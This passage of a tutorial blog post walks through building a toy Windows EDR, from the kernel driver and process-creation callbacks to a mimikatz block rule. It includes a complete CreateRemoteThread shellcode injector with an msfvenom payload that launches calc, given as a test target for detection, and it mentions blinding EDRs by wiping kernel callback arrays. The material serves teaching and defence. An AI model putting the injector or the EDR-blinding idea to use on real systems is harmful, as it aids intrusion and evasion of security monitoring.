preventing modification of critical kernel structures from other components that the kernel itself. With the release of PatchGuard it was no longer possible for an anti-virus to hook the SSDT or any critical structures in the kernel:\n\nObviously security tool editors went mad since it basically disabled pretty much all of their tools and some of them even tried to sue Microsoft.\nTo solve this issue and allow security products to monitor the system again, Microsoft added new functions to its OS that rely on a new mechanism called a callback object. Below is the definition of a callback object given by Microsoft:\n\nBasically these functions allow a kernel driver to be notified by the kernel each time a specific action is processed. As such, it permits software (like an EDR) to dynamically monitor what is happening on the system.\nThis mechanism is the first one we are going to implement in our EDR, but before we get to that we will need a kernel driver and thus we’ll need to have a better understanding of what a driver is and how we can develop one.\nIII/ What is a driver ?\nA driver is defined as a component that provides a software interface to a hardware device. A typical driver example would be the keyboard driver which translates electrical signal received from your keyboard inputs into a character that will be printed on your screen:\n\nThere are a lot of different drivers used on a system, for example the Bluetooth driver, the keyboard driver, the mouse driver and even the network input/output driver that is responsible for translating electrical signals into network packets that can be understood by the system.\nIf you want to take a look at the drivers that are running on your system, you can use the WinObj.exe tool from the SysInternals toolkit:\n\nMicrosoft provides a lot of drivers samples on their Github repository if you want to take a look at what the code of a driver looks like. You’ll soon realise that developing a driver is pretty complicated. As mentioned before, the smallest memory bug will crash the driver and thus the kernel. Because of this Microsoft provides a few frameworks that makes kernel driver development easier.\nThe main framework is called WDF (Windows Driver Framework) and is composed of two different sub-frameworks:\nKMDF (Kernel-Mode Driver Framework)\nUMDF (User-Mode Driver Framework)\nBoth these drivers have their pro’s and con’s:\n\nFrameworkPro’sCon’s\nKMDFGives full access to the kernelIs difficult to develop\nUMDFIs easy to developGives access to limited functions\n\n\n\n\n\nBefore you start developing a driver, you will have to determine what your needs are and what your driver will be used for. In our case, sadly, we’ll need to develop a kernel driver (KMDF) since we will use kernel functions and to develop a driver we will need a development environment!\nIV/ Setting up a development environment\nFirst things first, we will need to install Visual Studio, the SDK and the Windows Driver Kit. This is unfortunately a bit of a painful process, and depends on the version of Windows that you are running. At the time of this article, for Windows 10, you can follow this procedure in order to install every necessary component. Note even though it mentions Windows 11 it also works for Windows 10. Next we will have to install an additional Spectre library using the Visual Studio installer:\n\nAlternatively, if you don’t care about Spectre mitigations (which probably doesn’t matter for this test), or are having trouble with getting the versions right in Visual Studio, then you can disable it in the project properties.\n\nNext, in preparation for loading our own driver, we will disable the Operating Systems driver signing check. In an elevated command line prompt, type the following command:\nbcdedit /set testsigning on\nbcdedit -debug on\nThe reason why we need to do that is because since Windows 10 version 1507, it is no longer possible to load drivers that are not signed by Microsoft itself to help prevent rootkits. These commands simply disable the signing check and enable debug mode which will allow us to load our driver and debug it using WinDbg. Lastly we’ll need to enable the output of kernel messages to the debugger. To do so we’ll have to add the following key:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manage\\Debug Print Filter\nWith the value 0xf:\n\nNow reboot your computer. Open Visual Studio and create a new project “Kernel Mode Driver, Empty”:\n\nOnce created, you should get the following project structure:\n\nCreate a new source file, name it “driver.c” and add the following content (I’ll get back to what it does later):\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Driver device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Device symlink\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t    // Our driver object\n        0,\t\t\t\t\t    // Extra bytes needed (we don't need any)\n        &deviceName,            // The device name\n        FILE_DEVICE_UNKNOWN,    // The device type\n        0,\t\t\t\t\t    // Device characteristics (none)\n        FALSE,\t\t\t\t    // Sets the driver to not exclusive\n        &DeviceObject\t\t    // Pointer in which is stored the result of IoCreateDevice\n    );\n\n    if (!status) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(\n        &symlinkName, // The symbolic link name\n        &deviceName   // The device name\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n\n    return status;\n}\nIn the project properties, go to “Linker > Command Line” and add the following option which is going to disable the integrity check:\n\nAt this point the environment is ready to build the driver. Compile the project and launch the following commands in a admin command line (obviously adjust paths and names as needed):\nsc.exe create MyDumbEDR type=kernel binPath=C:\\\\Users\\windev\\Desktop\\x64\\Debug\\MyDumbEDR.sys\nsc.exe start MyDumbEDR\nHere is the output you’ll receive on your command line:\n\nAnd if you have got dbgview opened you should see your driver saying hello:\n\n\n\n\nPerfect! Now that the driver is running, let’s take a look at the content of a basic Windows kernel driver!\nV/ Developping a Windows kernel driver\nA driver, like any binaries, is composed of a main function called a DriverEntry that has the following prototype:\nNTSTATUS DriverEntry(\n    PDRIVER_OBJECT  DriverObject,\n    PUNICODE_STRING RegistryPath\n);\nWith:\nDriverObject: a pointer to a structure that contains the driver’s information, below is the content of this structure:\n//0x150 bytes (sizeof)\nstruct _DRIVER_OBJECT\n{\n    SHORT Type;                                                                    //0x0\n    SHORT Size;                                                                    //0x2\n    struct _DEVICE_OBJECT* DeviceObject;                                           //0x8\n    ULONG Flags;                                                                   //0x10\n    VOID* DriverStart;                                                             //0x18\n    ULONG DriverSize;                                                              //0x20\n    VOID* DriverSection;                                                           //0x28\n    struct _DRIVER_EXTENSION* DriverExtension;                                     //0x30\n    struct _UNICODE_STRING DriverName;                                             //0x38\n    struct _UNICODE_STRING* HardwareDatabase;                                      //0x48\n    struct _FAST_IO_DISPATCH* FastIoDispatch;                                      //0x50\n    LONG (*DriverInit)(struct _DRIVER_OBJECT* arg1, struct _UNICODE_STRING* arg2); //0x58\n    VOID (*DriverStartIo)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);         //0x60\n    VOID (*DriverUnload)(struct _DRIVER_OBJECT* arg1);                             //0x68\n    LONG (*MajorFunction[28])(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);     //0x70\n}; \nRegistryPath: a pointer to a unicode string containing the path to the driver’s parameters key which is usually located under the following registry key:\nHKLM:\\SYSTEM\\CurrentControlSet\\Service\nIf we take a look at content of the DriverEntry’s function, we can see that, apart from the DbgPrintEx functions used to print messages in dbgview, two functions are called:\nIoCreateDevice: used to create a device object representing our driver\nIoCreateSymbolicLink: used to create the symbolic link that we will use to contact our driver\nThese functions are the mandatory ones that we need to specify in order to load a driver on the system.\nThe second important line specifies a routine to run when the driver is unloaded:\nDriverObject->DriverUnload = UnloadMyDumbEDR;\nIn our code, the routine is the following function:\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\nAs you can see this is the exact opposite of the loading routine, it deletes the device as well as the symbolic link. And that’s it, at this point we have got a working kernel driver. It does nothing yet but it runs so let’s implement one of the first mechanisms used by EDR’s to monitor the system: callback objects!\nVI/ Implement function callback\nAs we have seen before, function callbacks are functions that can be used by a driver to register what is called a kernel callback. The underlying idea of a kernel callback is that, each time a particular action is done on the system, the kernel will inform the driver that registered the callback, that an action is being performed.\nTo register such kernel callback, you can use a function callback that will allow you to monitor for specific events. The most well known function callbacks are:\nPsSetCreateProcessNotifyRoutine: used to monitor process creation\nPsSetLoadImageNotifyRoutine: used to monitor DLL loading\nPsSetThreadCreateNotifyRoutine: used to monitor thread creation\nObRegisterCallbacks: used to monitor calls to the OpenProcess, OpenThread and OpenDesktop functions\nCmRegisterCallbacks: used to monitor the creation, modification and deletion of a registry key.\nIoRegisterShutdown: monitor the shutdown of the computer?\nIoRegisterFsRegistrationChange: monitor the modification of a file\nBelow you will find a schema that sums up the process of registering a function callback in order to monitor for process creation:\n\nAs you can see, being aware of a process being created is very interesting and important information for an EDR. For that reason, each and every EDR’s driver registers kernel callbacks in order to monitor process creation via the PsSetCreateProcessNotifyRoutine function. It’s prototype is the following:\nNTSTATUS PsSetCreateProcessNotifyRoutine(\n    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, // Pointer to the function to execute when a process is created\n    BOOLEAN                        Remove         // Whether the routine specified by NotifyRoutine should be added to or removed from the system's list of notification routines\n);\nPretty simple right? The first argument is a pointer to a routine that is going to be executed each time the driver receives a notification from the kernel while the second one specifies whether the callback should be registered or unregistered. In the following code, this routine is the CreateProcessNotifyRoutine function:\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Symlink\n\n// handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(HANDLE ppid, HANDLE pid, BOOLEAN create){\n    if (create){\n        PEPROCESS process = NULL;\n        PUNICODE_STRING processName = NULL;\n\n        // Retrieve process ID\n        PsLookupProcessByProcessId(pid, &process);\n\n        // Retrieve the process name from the EPROCESS structure\n        SeLocateProcessImageName(process, &processName);\n\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: %d (%wZ) launched.\\n\", pid, processName);\n    }\n    else{\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: %d got killed.\\n\", pid);\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath){\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n    \n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &DeviceObject\t\t   // the resulting pointer\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&symlinkName, &deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);\n    \n    return STATUS_SUCCESS;\n}\nBuild the driver, launch it, open DbgView and spawn whatever process you want. If everything went well you should see debug messages in DbgView printing the PID, as well as the process name of the process being launched or killed:\n\nBeing aware of process creation sure is interesting but we need to develop logic that is going to allow our EDR to determine whether or not the target process should be created in the first place. To do this we will have to use the extended function of PsSetCreateProcessNotifyRoutine called PsSetCreateProcessNotifyRoutineEx. The prototype for this function is the following:\nNTSTATUS PsSetCreateProcessNotifyRoutineEx(\n    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, // Pointer to the PCreateProcessNotifyRoutineEx structure\n    BOOLEAN                           Remove         // Whether or not we should add or remove the callback\n);\nAt first glance the functions PsSetCreateProcessNotifyRoutineEx and PsSetCreateProcessNotifyRoutine look identical but when we take a closer look at the first argument of the PsSetCreateProcessNotifyRoutineEx we can see that the structure is a little bit more complex:\nPCREATE_PROCESS_NOTIFY_ROUTINE PcreateProcessNotifyRoutine;\nvoid PcreateProcessNotifyRoutineEx(\n    PEPROCESS Process,                  // Pointer to the EPROCESS structure\n    HANDLE ProcessId,                   // Process PID\n    PPS_CREATE_NOTIFY_INFO CreateInfo   // Process structure containing information about the process being launched\n)\nThe third variable contains information about the process being launched such as its command line, its parent PID, its image filename and so on:\ntypedef struct _PS_CREATE_NOTIFY_INFO {\n    SIZE_T              Size;\n    union {\n        ULONG Flags;\n        struct {\n            ULONG FileOpenNameAvailable : 1;  //\n            ULONG IsSubsystemProcess : 1;     \n            ULONG Reserved : 30;\n        };\n    };\n    HANDLE              ParentProcessId;     // Parent PID\n    CLIENT_ID           CreatingThreadId;    // Thread id \n    struct _FILE_OBJECT *FileObject; \n    PCUNICODE_STRING    ImageFileName;       // Name of the binary\n    PCUNICODE_STRING    CommandLine;         // Arguments passed to the binary\n    NTSTATUS            CreationStatus;      // This variable holds whether or not the process should be created\n} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;\nWhat’s interesting here is the CreationStatus variable which is where the driver will store its decision (i.e., should we allow or deny the process creation). This variable can contain two values:\nSTATUS_SUCCESS: the driver informs the kernel that the process can be launched\nSTATUS_ACCESS_DENIED: the driver informs the kernel that the process can not be launched\nHere is the final implementation of the kernel callback mechanism on our dumb EDR:\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Symlink\n\n// Handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo) {\n    UNREFERENCED_PARAMETER(process);\n    UNREFERENCED_PARAMETER(pid);\n    \n    // Never forget this if check because if you don't, you'll end up crashing your Windows system ;P\n    if (createInfo != NULL) {\n        // Compare the command line of the launched process to the notepad string\n        if (wcsstr(createInfo->CommandLine->Buffer, L\"notepad\") != NULL){\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Process (%ws) allowed.\\n\", createInfo->CommandLine->Buffer);\n            // Process allowed\n            createInfo->CreationStatus = STATUS_SUCCESS;\n        }\n\n        // Compare the command line of the launched process to the mimikatz string\n        if (wcsstr(createInfo->CommandLine->Buffer, L\"mimikatz\") != NULL) {\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Process (%ws) denied.\\n\", createInfo->CommandLine->Buffer);\n            // Process denied\n            createInfo->CreationStatus = STATUS_ACCESS_DENIED;\n        }\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &DeviceObject\t\t   // the resulting pointer\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&symlinkName, &deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Registers the kernel callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Driver created\\n\");\n    return STATUS_SUCCESS;\n}\nThe logic is pretty dumb, but for demonstration purposes if the image filename of the process being created is mimikatz, then the EDR blocks the creation of the process:\n\n\n\n\nAs you can see, notepad.exe is allowed while mimikatz.exe is denied, perfect!\nNow to go a little deeper in the kernel callback mechanism, we may ask ourself how the kernel is able to know if a driver registered a kernel callback? Well for each function callback we mentioned before, there is an array in kernel memory that stores pointers to callbacks (like those from EDR routines):\n\nFunction callbackCorresponding array namMax number of callbacks\nPsSetCreateProcessNotifyRoutinePspCreateProcessNotifyRoutine64\nPsSetCreateThreadNotifyRoutinePspCreateThreadNotifyRoutine64\nPsSetLoadImageNotifyRoutinePspLoadImageNotifyRoutine8\nCmRegisterCallbackCmpCallBackVector100\n\n\n\n\n\nUsing WinDBG.exe we can check the actual content of these arrays. For example on the following screenshot we can see that the PspCreateProcessNotifyRoutine contains 9 hexadecimal addresses, hence 9 kernel callbacks:\n\nTherefore, each time a process is launched, the kernel will read the PspCreateProcessNotifyRoutine array and for each of the 9 pointers, it will send a notification about the process being created. As an attacker these arrays are specifically interesting because if you can overwrite them or remove the pointers, you will basically be able to “blind” the EDR and thus prevent it from monitoring the system (and there is already a pretty cool tool that will allow you doing that, CheekyBlinder).\nAt this point our driver is able to monitor for process creation and deny it if the image filename is mimikatz. Obviously this logic is not enough because if you rename mimikatz.exe to notmimikatz.exe, you will bypass the check. Thus we will have to develop a more complex detection routine.\nVII/ From theorical kernel callbacks to a fully working EDR\nJust being aware of a process being created on the system is interesting but if we don’t act on the information, it’s useless. As a security product developer we need to implement some sort of logic that will allow us to determine if this process is legitimate or not. For security and stability reasons (mostly because developing in kernel space is a nightmare) every EDR relies on a user space agent that orchestrates the entire EDR solution. This agent is typically doing at least two things:\nIt analyzes binaries being launched on the system statically\nIt injects a custom DLL into the process in order to monitor API calls\nSo basically a more realistic, yet simplistic, schema of how a EDR works would be the following:\n\nThe kernel driver receives notifications about specific actions being executed on the system via the kernel callbacks mechanism, then it forwards this to the agent where most of the detection logic is developed.\nSo we are going to have to develop a custom user space agent that is going to be the one analysing the system. But before going further let’s settle on what are our expectations for our EDR. At this point the only thing I wanted MyDumbEDR to be able to detect is binaries that attempt to inject shellcode into remote process using the following simple CreateRemoteThread technique:\n\n#include \"stdio.h\"\n#include <Windows.h>\n#include <TlHelp32.h>\n\nint get_process_id_from_szexefile(wchar_t processName[]) {\n\tPROCESSENTRY32 entry = { 0 };\n\tentry.dwSize = sizeof(PROCESSENTRY32);\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\tif (Process32First(snapshot, &entry) == TRUE) {\n\t\twhile (Process32Next(snapshot, &entry) == TRUE) {\n\t\t\tif (wcscmp(entry.szExeFile, processName) == 0) {\n\t\t\t\treturn entry.th32ProcessID;\n\t\t\t}\n\t\t}\n\t}\n\telse {\n\t\tprintf(\"CreateToolhelper32Snapshot failed : %d\\n\", GetLastError());\n\t\texit(1);\n\t}\n\tprintf(\"Process not found.\\n\");\n\texit(1);\n}\n\nvoid check_if_se_debug_privilege_is_enabled() {\n\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());\n\tHANDLE hToken;\n\tOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);\n\tDWORD cbSize;\n\tGetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);\n\tPTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);\n\tGetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);\n\tDWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));\n\n\tTOKEN_PRIVILEGES tp;\n\n\tLUID luidSeDebugPrivilege;\n\tif (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0) {\n\t\tprintf(\"SeDebugPrivilege not owned\\n\");\n\t}\n\telse {\n\t\tprintf(\"SeDebugPrivilege owned\\n\");\n\t}\n\ttp.PrivilegeCount = 1;\n\ttp.Privileges[0].Luid = luidSeDebugPrivilege;\n\ttp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\tif (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {\n\t\tprintf(\"SeDebugPrivilege adjust token failed: %d\\n\", GetLastError());\n\t}\n\telse {\n\t\tprintf(\"SeDebugPrivilege enabled.\\n\");\n\t}\n\n\tCloseHandle(hProcess);\n\tCloseHandle(hToken);\n}\n\nint main() {\n\tprintf(\"Launching remote shellcode injection\\n\");\n\t\n\t// DO NOT REMOVE\n\t// When loading a DLL remotely, its content won't apply until all DLL's are loaded\n\t// For some reason it leads to a race condition which is not part of the challenge\n\t// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)\n\tSleep(5000);\n\t// DO NOT REMOVE\n\tcheck_if_se_debug_privilege_is_enabled();\n\twchar_t processName[] = L\"notepad.exe\";\n\tint processId = get_process_id_from_szexefile(processName);\n\tprintf(\"Injecting to PID: %i\\n\", processId);\n\tHANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processId));\n\t\n\t\n\t// msfvenom -p windows/x64/exec CMD=calc.exe -b \"\\x00\\x0a\\0d\" -f c\n\tunsigned char shellcode[] =\n\t\t\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xdb\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\"\n\t\t\"\\xff\\xff\\x48\\xbb\\x33\\xef\\x18\\x46\\xf8\\x06\\x62\\xef\\x48\\x31\\x58\"\n\t\t\"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xcf\\xa7\\x9b\\xa2\\x08\\xee\"\n\t\t\"\\xa2\\xef\\x33\\xef\\x59\\x17\\xb9\\x56\\x30\\xbe\\x65\\xa7\\x29\\x94\\x9d\"\n\t\t\"\\x4e\\xe9\\xbd\\x53\\xa7\\x93\\x14\\xe0\\x4e\\xe9\\xbd\\x13\\xa7\\x93\\x34\"\n\t\t\"\\xa8\\x4e\\x6d\\x58\\x79\\xa5\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xd3\\x79\"\n\t\t\"\\x3a\\xfa\\x2a\\x42\\xae\\xf2\\x26\\x15\\x07\\xf9\\xc7\\x80\\x02\\x61\\xae\"\n\t\t\"\\x49\\x0e\\x73\\x54\\x42\\x64\\x71\\xd3\\x50\\x47\\x28\\x8d\\xe2\\x67\\x33\"\n\t\t\"\\xef\\x18\\x0e\\x7d\\xc6\\x16\\x88\\x7b\\xee\\xc8\\x16\\x73\\x4e\\x7a\\xab\"\n\t\t\"\\xb8\\xaf\\x38\\x0f\\xf9\\xd6\\x81\\xb9\\x7b\\x10\\xd1\\x07\\x73\\x32\\xea\"\n\t\t\"\\xa7\\x32\\x39\\x55\\x77\\x31\\x4e\\x53\\x2f\\x9f\\xae\\xd9\\x8f\\xf5\\x47\"\n\t\t\"\\x63\\x2e\\x0b\\x0f\\x6d\\xb7\\xb4\\x05\\x2e\\xcb\\x3b\\xaa\\x21\\x97\\x8d\"\n\t\t\"\\xde\\x3a\\xab\\xb8\\xaf\\x3c\\x0f\\xf9\\xd6\\x04\\xae\\xb8\\xe3\\x50\\x02\"\n\t\t\"\\x73\\x46\\x7e\\xa6\\x32\\x3f\\x59\\xcd\\xfc\\x8e\\x2a\\xee\\xe3\\xae\\x40\"\n\t\t\"\\x07\\xa0\\x58\\x3b\\xb5\\x72\\xb7\\x59\\x1f\\xb9\\x5c\\x2a\\x6c\\xdf\\xcf\"\n\t\t\"\\x59\\x14\\x07\\xe6\\x3a\\xae\\x6a\\xb5\\x50\\xcd\\xea\\xef\\x35\\x10\\xcc\"\n\t\t\"\\x10\\x45\\x0e\\x42\\x07\\x62\\xef\\x33\\xef\\x18\\x46\\xf8\\x4e\\xef\\x62\"\n\t\t\"\\x32\\xee\\x18\\x46\\xb9\\xbc\\x53\\x64\\x5c\\x68\\xe7\\x93\\x43\\xf6\\xd7\"\n\t\t\"\\x4d\\x65\\xae\\xa2\\xe0\\x6d\\xbb\\xff\\x10\\xe6\\xa7\\x9b\\x82\\xd0\\x3a\"\n\t\t\"\\x64\\x93\\x39\\x6f\\xe3\\xa6\\x8d\\x03\\xd9\\xa8\\x20\\x9d\\x77\\x2c\\xf8\"\n\t\t\"\\x5f\\x23\\x66\\xe9\\x10\\xcd\\x05\\xc2\\x5a\\x35\\x86\\x5d\\x8b\\x77\\x31\"\n\t\t\"\\x8b\\x5a\\x31\\x96\\x40\\x9b\\x7d\\x2b\\xcb\\x34\\x3e\\x8c\\x52\\x83\\x7b\"\n\t\t\"\\x68\\x9d\\x7e\\x07\\xef\";\n    printf(\"VirtualAllocEx\\n\");\n\tPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\t\n\tprintf(\"WriteProcessMemory\\n\");\n\tWriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);\n\t\n\tprintf(\"CreateRemoteThread\\n\");\n\tHANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\n\t\n\tprintf(\"Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\\n\");\n\tprintf(\"Expect more checks in the upcoming weeks ;)\\n\");\n\tCloseHandle(processHandle);\n\treturn 0;\n}\nThere are quite a few markers that can be used to flag this binary as malicious. First, it uses multiple functions in an order that is suspicious: OpenProcess > VirtualAllocEx > WriteProcessMemory > CreateRemoteThread. Then, the binary is allocating RWX (read, write, execute) memory which is suspicious. Finally it contains suspicious strings as well as an obviously flagged msfvenom shellcode payload.\nFor our EDR, I decided to create two agents instead of one. Both these agents will receive information from the driver via a named pipe which is an Internal Process Communication mechanism.\nThus, the MyDumbEDR relies on 3 components:\nThe kernel driver which will receive notifications about processes being created\nThe StaticAnalyzer agent which will statically analyse the binary\nThe RemoteInjector agent which will inject a custom DLL in each process being created\nSchematically:\n\nLet’s take a closer look at what both the agents do.\n1/ The static analyzer\nThe static analyser receives the path of the image filename of the processes being launched. It will then statically check for three things:\nIf the 